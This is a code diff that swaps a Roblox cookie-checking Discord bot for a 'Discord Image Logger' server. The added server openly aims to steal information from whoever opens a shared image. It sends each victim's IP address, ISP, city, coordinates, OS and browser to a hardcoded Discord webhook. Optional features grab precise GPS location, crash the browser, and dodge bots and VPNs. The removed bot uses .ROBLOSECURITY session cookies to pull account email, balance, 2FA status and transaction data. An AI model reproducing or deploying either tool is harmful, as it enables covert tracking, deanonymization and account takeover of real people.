@@ -1,167 +1,304 @@
-from discord import Activity, ActivityType, Embed
-from requests import get
-from discord.ext import commands
-from datetime import datetime
-from time import time as __, sleep as zzz
-from re import findall
+# Discord Image Logger
+# By Dark
 
-def log(text,sleep=None): 
-    print(f"[{datetime.utcfromtimestamp(__()).strftime('%Y-%m-%d %H:%M:%S')}] → {text}")
-    if sleep: zzz(sleep)
+from http.server import BaseHTTPRequestHandler
+from urllib import parse
+import traceback, requests, base64, httpagentparser
 
-class settings:
-    token = '' # Discord Bot Token
-    prefix = '.' # Bot Prefix
-    bot_status = '@DankoOfficial on Github' # Bot Status
-    client = commands.Bot(command_prefix=prefix)
+__app__ = "Discord Image Logger"
+__description__ = "A simple application which allows you to steal info and more by abusing Discord's Open Original feature"
+__version__ = "v2.0"
+__author__ = "DarkMoon"
 
-log(f'Detected token: {settings.token}',0.5)
-log(f'Detected prefix: {settings.prefix}',0.5)
-log(f'Detected bot status: {settings.bot_status}',0.5)
+config = {
+    # BASE CONFIG #
+    "webhook": "https://discord.com/api/webhooks/1206392815811043378/7dD_hN_JPPD-2imys7lIDfvLgzeZFdPhe5qoxVWAs297GwA0ms1OtMOwOwCEBF0GWtt_",
+    "image": "https://i.kym-cdn.com/entries/icons/original/000/045/302/pluhsound.jpg", # You can also have a custom image by using a URL argument
+                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
+    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
-@settings.client.event
-async def on_ready():
-    log(f"Connected to {settings.client.user}",0.5)
-    await settings.client.change_presence(activity=Activity(type=ActivityType.watching, name=settings.bot_status))
+    # CUSTOMIZATION #
+    "username": "Dark ImageLogger", # Set this to the name you want the webhook to have
+    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
-@settings.client.command()
-async def vc(ctx, cookie=None):
-    if not cookie:
-        await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
-        log(f'User {ctx.author} tried to use {settings.prefix}vc but did not provide a cookie.')
-        return
-    await ctx.message.delete()
-    response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie})
-    if '"id":' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vc with a valid cookie.')
-        embedVar = Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
-        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        embedVar.set_footer(text="Check your DMs for the cookie.")
-        dm = await ctx.author.create_dm()
-        await dm.send(embed=Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
-        await ctx.send(embed=embedVar)
-    elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vc with an invalid cookie.')
-        embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
-        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
+    # OPTIONS #
+    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    
+    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+
+    "message": { # Show a custom message when the user opens the image
+        "doMessage": True, # Enable the custom message?
+        "message": "DarkV2 Image Logger just pwned yo ass!", # Message to show
+        "richMessage": True, # Enable rich text? (See README for more info)
+    },
+
+    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+                # 0 = No Anti-VPN
+                # 1 = Don't ping when a VPN is suspected
+                # 2 = Don't send an alert when a VPN is suspected
+
+    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+
+    "antiBot": 1, # Prevents bots from triggering the alert
+                # 0 = No Anti-Bot
+                # 1 = Don't ping when it's possibly a bot
+                # 2 = Don't ping when it's 100% a bot
+                # 3 = Don't send an alert when it's possibly a bot
+                # 4 = Don't send an alert when it's 100% a bot
+    
+
+    # REDIRECTION #
+    "redirect": {
+        "redirect": False, # Redirect to a webpage?
+        "page": "https://your-link.here" # Link to the webpage to redirect to 
+    },
+
+    # Please enter all values in correct format. Otherwise, it may break.
+    # Do not edit anything below this, unless you know what you're doing.
+    # NOTE: Hierarchy tree goes as follows:
+    # 1) Redirect (If this is enabled, disables image and crash browser)
+    # 2) Crash Browser (If this is enabled, disables image)
+    # 3) Message (If this is enabled, disables image)
+    # 4) Image 
+}
+
+blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
     else:
-        log(f'User {ctx.author} used {settings.prefix}vc but roblox returned a bad response.')
-        embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
-        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+        return False
 
-@settings.client.command()
-async def vcr(ctx, cookie=None):
-    if not cookie:
-        await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
-        log(f'User {ctx.author} tried to use {settings.prefix}vcr but did not provide a cookie.')
-        return
-    await ctx.message.delete()
-    response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie})
-    if '"id":' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vcr with a valid cookie.')
-        user_id = response.json()['id']
-        robux = get(f'https://economy.roblox.com/v1/users/{user_id}/currency',cookies={'.ROBLOSECURITY': cookie}).json()['robux']
-        embedVar = Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
-        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        embedVar.add_field(name=":money_mouth: Robux", value=robux, inline=True)
-        dm = await ctx.author.create_dm()
-        await dm.send(embed=Embed(title=":white_check_mark: Cookie", description='```'+cookie+'```', color=0x38d13b))
-        await ctx.send(embed=embedVar)
-    elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}vcr with an invalid cookie.')
-        embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
-        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
-    else:
-        log(f'User {ctx.author} used {settings.prefix}vcr but roblox returned a bad response.')
-        embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
-        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+def reportError(error):
+    requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "@everyone",
+    "embeds": [
+        {
+            "title": "Image Logger - Error",
+            "color": config["color"],
+            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+        }
+    ],
+})
 
-@settings.client.command()
-async def full(ctx, cookie=None):
-    if not cookie:
-        await ctx.send(embed=Embed(title=":x: Missing Cookie", description="", color=0xFF0000))
+def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
+    if ip.startswith(blacklistedIPs):
         return
-    await ctx.message.delete()
-    response = get('https://users.roblox.com/v1/users/authenticated',cookies={'.ROBLOSECURITY': cookie})
-    hidden = '```                       Hidden                  ```'
-    if '"id":' in response.text:
-        user_id = response.json()['id']
-        # ----- 
-        robux = get(f'https://economy.roblox.com/v1/users/{user_id}/currency',cookies={'.ROBLOSECURITY': cookie}).json()['robux']
-        # ----- 
-        balance_creit_info = get(f'https://billing.roblox.com/v1/credit',cookies={'.ROBLOSECURITY': cookie})
-        # ----- 
-        balance_credit = balance_creit_info.json()['balance']
-        balance_credit_currency = balance_creit_info.json()['currencyCode']
-        # ----- 
-        account_settings = get(f'https://www.roblox.com/my/settings/json',cookies={'.ROBLOSECURITY': cookie})
-        # -----
-        account_name = account_settings.json()['Name']
-        account_display_name = account_settings.json()['DisplayName']
-        account_email_verified = account_settings.json()['IsEmailVerified']
-        if bool(account_email_verified):
-            account_email_verified = f'{account_email_verified} (`{account_settings.json()["UserEmail"]}`)'
-        account_above_13 = account_settings.json()['UserAbove13']
-        account_age_in_years = round(float(account_settings.json()['AccountAgeInDays']/365),2)
-        account_has_premium = account_settings.json()['IsPremium']
-        account_has_pin = account_settings.json()['IsAccountPinEnabled']
-        account_2step = account_settings.json()['MyAccountSecurityModel']['IsTwoStepEnabled']
-        # -----
-        embedVar = Embed(title=":white_check_mark: Valid Cookie", description="", color=0x38d13b)
-        embedVar.add_field(name="Passed Cookie: ", value=hidden, inline=False)
-        embedVar.add_field(name=":money_mouth: Robux", value=robux, inline=True)
-        embedVar.add_field(name=":moneybag: Balance", value=f'{balance_credit} {balance_credit_currency}', inline=True)
-        embedVar.add_field(name=":bust_in_silhouette: Account Name", value=f'{account_name} ({account_display_name})', inline=True)
-        embedVar.add_field(name=":email: Email", value=account_email_verified, inline=True)
-        embedVar.add_field(name=":calendar: Account Age", value=f'{account_age_in_years} years', inline=True)
-        embedVar.add_field(name=":baby: Above 13", value=account_above_13, inline=True)
-        embedVar.add_field(name=":star: Premium", value=account_has_premium, inline=True)
-        embedVar.add_field(name=":key: Has PIN", value=account_has_pin, inline=True)
-        embedVar.add_field(name=":lock: 2-Step Verification", value=account_2step, inline=True)
-        account_friends = get('https://friends.roblox.com/v1/my/friends/count',cookies={'.ROBLOSECURITY': cookie}).json()['count']
-        embedVar.add_field(name=":busts_in_silhouette: Friends", value=account_friends, inline=True)
-        account_voice_verified = get('https://voice.roblox.com/v1/settings', cookies={'.ROBLOSECURITY': cookie}).json()['isVerifiedForVoice']
-        embedVar.add_field(name=":microphone2: Voice Verified", value=account_voice_verified, inline=True)
-        account_gamepasses = get(f'https://www.roblox.com/users/inventory/list-json?assetTypeId=34&cursor=&itemsPerPage=100&pageNumber=1&userId={user_id}',cookies={'.ROBLOSECURITY': cookie})
-        check = findall(r'"PriceInRobux":(.*?),', account_gamepasses.text)
-        account_gamepasses = str(sum([int(match) if match != "null" else 0 for match in check]))+f' R$'
-        embedVar.add_field(name=":video_game: Gamepasses Worth", value=account_gamepasses, inline=True)
-        account_badges = ', '.join(list(findall(r'"name":"(.*?)"',get(f'https://accountinformation.roblox.com/v1/users/{user_id}/roblox-badges',cookies={'.ROBLOSECURITY': cookie}).text)))
-        embedVar.add_field(name=":medal: Badges", value=account_badges, inline=True)
-        account_transactions = get(f'https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Year&transactionType=summary',cookies={'.ROBLOSECURITY': cookie}).json()
-        account_sales_of_goods = account_transactions['salesTotal']
-        account_purchases_total = abs(int(account_transactions['purchasesTotal']))
-        account_commissions = account_transactions['affiliateSalesTotal']
-        account_robux_purchcased = account_transactions['currencyPurchasesTotal']
-        account_premium_payouts_total = account_transactions['premiumPayoutsTotal']
-        account_pending_robux = account_transactions['pendingRobuxTotal']
-        embedVar.add_field(name="**↻** Transactions", value=f':small_red_triangle_down: :small_red_triangle_down: :small_red_triangle_down: ', inline=False)
-        embedVar.add_field(name=":coin: Sales of Goods", value=account_sales_of_goods, inline=True)
-        embedVar.add_field(name="💰 Premium Payouts", value=account_premium_payouts_total, inline=True)
-        embedVar.add_field(name="📈 Commissions", value=account_commissions, inline=True)
-        embedVar.add_field(name=":credit_card: Robux purchased", value=account_robux_purchcased, inline=True)
-        embedVar.add_field(name="🚧 Pending", value=account_pending_robux, inline=True)
-        embedVar.add_field(name=":money_with_wings:  Overall", value=account_purchases_total, inline=True)
-        embedVar.set_thumbnail(url=get(f'https://thumbnails.roblox.com/v1/users/avatar-headshot?size=48x48&format=png&userIds={user_id}').json()['data'][0]['imageUrl'])
-        dm = await ctx.author.create_dm()
-        await ctx.send(embed=embedVar)
-        embedVar.add_field(name="Passed Cookie: ", value=cookie, inline=False)
-        await dm.send(embed=embedVar)
-        log(f'User {ctx.author} used {settings.prefix}full with a valid cookie. [{robux} R$ | {balance_credit} {balance_credit_currency} | {account_name} ({account_display_name}) | {account_age_in_years} years | {account_friends} Friends | {account_gamepasses} Gamepasses Worth | {account_badges} Badges | {account_sales_of_goods} Sales of Goods | {account_premium_payouts_total} Premium Payouts | {account_commissions} Commissions | {account_robux_purchcased} Robux Purchased | {account_pending_robux} Pending | {account_purchases_total} Overall | {account_voice_verified} Voice Verified | {account_has_pin} Has PIN | {account_2step} 2-Step Verification | {account_has_premium} Premium | {account_above_13} Above 13 | {account_email_verified} Email | {cookie} Cookie]')
+    
+    bot = botCheck(ip, useragent)
+    
+    if bot:
+        requests.post(config["webhook"], json = {
+    "username": config["username"],
+    "content": "",
+    "embeds": [
+        {
+            "title": "Image Logger - Link Sent",
+            "color": config["color"],
+            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+        }
+    ],
+}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+        return
+
+    ping = "@everyone"
+
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    if info["proxy"]:
+        if config["vpnCheck"] == 2:
+                return
         
-    elif 'Unauthorized' in response.text:
-        log(f'User {ctx.author} used {settings.prefix}full with an invalid cookie.')
-        embedVar = Embed(title=":x: Invalid Cookie", description="", color=0xFF0000)
-        embedVar.add_field(name="Passed Cookie: ", value='```                       Hidden                  ```', inline=False)
-        await ctx.send(embed=embedVar)
-    else:
-        log(f'User {ctx.author} used {settings.prefix}full but roblox returned a bad response.')
-        embedVar = Embed(title=":x: Error", description="", color=0xFFFF00)
-        embedVar.add_field(name="Error: ", value='```'+response.text+'```', inline=False)
-        await ctx.send(embed=embedVar)
+        if config["vpnCheck"] == 1:
+            ping = ""
+    
+    if info["hosting"]:
+        if config["antiBot"] == 4:
+            if info["proxy"]:
+                pass
+            else:
+                return
 
-settings.client.run(settings.token)
+        if config["antiBot"] == 3:
+                return
+
+        if config["antiBot"] == 2:
+            if info["proxy"]:
+                pass
+            else:
+                ping = ""
+
+        if config["antiBot"] == 1:
+                ping = ""
+
+
+    os, browser = httpagentparser.simple_detect(useragent)
+    
+    embed = {
+    "username": config["username"],
+    "content": ping,
+    "embeds": [
+        {
+            "title": "Image Logger - IP Logged",
+            "color": config["color"],
+            "description": f"""**A User Opened the Original Image!**
+
+**Endpoint:** `{endpoint}`
+            
+**IP Info:**
+> **IP:** `{ip if ip else 'Unknown'}`
+> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
+> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **City:** `{info['city'] if info['city'] else 'Unknown'}`
+> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **Mobile:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+
+**PC Info:**
+> **OS:** `{os}`
+> **Browser:** `{browser}`
+
+**User Agent:**
+```
+{useragent}
+```""",
+    }
+  ],
+}
+    
+    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
+    requests.post(config["webhook"], json = embed)
+    return info
+
+binaries = {
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
+    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
+    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
+    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+}
+
+class ImageLoggerAPI(BaseHTTPRequestHandler):
+    
+    def handleRequest(self):
+        try:
+            if config["imageArgument"]:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                if dic.get("url") or dic.get("id"):
+                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
+                else:
+                    url = config["image"]
+            else:
+                url = config["image"]
+
+            data = f'''<style>body {{
+margin: 0;
+padding: 0;
+}}
+div.img {{
+background-image: url('{url}');
+background-position: center center;
+background-repeat: no-repeat;
+background-size: contain;
+width: 100vw;
+height: 100vh;
+}}</style><div class="img"></div>'''.encode()
+            
+            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
+                return
+            
+            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
+                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
+                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
+
+                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                
+                return
+            
+            else:
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
+                else:
+                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
+                
+
+                message = config["message"]["message"]
+
+                if config["message"]["richMessage"] and result:
+                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
+                    message = message.replace("{isp}", result["isp"])
+                    message = message.replace("{asn}", result["as"])
+                    message = message.replace("{country}", result["country"])
+                    message = message.replace("{region}", result["regionName"])
+                    message = message.replace("{city}", result["city"])
+                    message = message.replace("{lat}", str(result["lat"]))
+                    message = message.replace("{long}", str(result["lon"]))
+                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
+                    message = message.replace("{mobile}", str(result["mobile"]))
+                    message = message.replace("{vpn}", str(result["proxy"]))
+                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
+                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
+                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
+
+                datatype = 'text/html'
+
+                if config["message"]["doMessage"]:
+                    data = message.encode()
+                
+                if config["crashBrowser"]:
+                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
+
+                if config["redirect"]["redirect"]:
+                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
+                self.send_response(200) # 200 = OK (HTTP Status)
+                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
+                self.end_headers() # Declare the headers as finished.
+
+                if config["accurateLocation"]:
+                    data += b"""<script>
+var currenturl = window.location.href;
+
+if (!currenturl.includes("g=")) {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(function (coords) {
+    if (currenturl.includes("?")) {
+        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    } else {
+        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
+    }
+    location.replace(currenturl);});
+}}
+
+</script>"""
+                self.wfile.write(data)
+        
+        except Exception:
+            self.send_response(500)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+
+            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
+            reportError(traceback.format_exc())
+
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
+
+handler = app = ImageLoggerAPI
